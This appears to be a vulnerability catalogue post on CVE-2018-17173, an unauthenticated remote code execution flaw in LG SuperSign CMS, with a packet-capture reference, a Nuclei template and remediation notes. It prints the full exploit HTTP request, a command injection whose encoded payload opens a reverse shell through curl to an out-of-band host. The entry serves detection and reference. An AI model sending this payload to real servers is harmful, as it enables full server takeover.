---
layout: post
cve_id: CVE-2018-17173
title: LG Supersign EZ CMS - Remote Code Execution
pcap: true
pcap_path: /pcaps/2018/CVE-2018-17173.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-17173.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pussycat0x
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary system commands on LG SuperSign
  CMS servers via the sourceUri parameter, leading to complete server compromise and
  potential access to connected digital signage systems.

  '
remediation: 'Upgrade to a patched version of LG SuperSign CMS that addresses CVE-2018-17173.

  '
reference:
- http://mamaquieroserpentester.blogspot.com/2018/09/lg-supersign-rce-to-luna-and-back-to.html
- http://packetstormsecurity.com/files/152733/LG-Supersign-EZ-CMS-Remote-Code-Execution.html
- https://www.exploit-db.com/exploits/45448/
- https://www.exploit-db.com/exploits/46795/
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-17173
  cwe-id: CWE-94
  epss-score: 0.76568
  epss-percentile: 0.98896
  cpe: cpe:2.3:a:lg:supersign_cms:2.5:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: lg
  product: supersign_cms
  fofa-query: title="LG SuperSign"
tags:
- cve
- cve2018
- lg
- supersign-cms
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
LG SuperSign CMS allows remote attackers to execute arbitrary code via the sourceUri parameter to qsr_server/device/getThumbnail.


## ðŸŒ HTTP Request
```nohighlight
GET /qsr_server/device/getThumbnail?sourceUri=\'%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//d5jptu9le0o4701p4hvgpdzzzmjgpbr5u.oast.online%2b>/tmp/f%253b\';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
Connection: close
Accept-Encoding: gzip
```

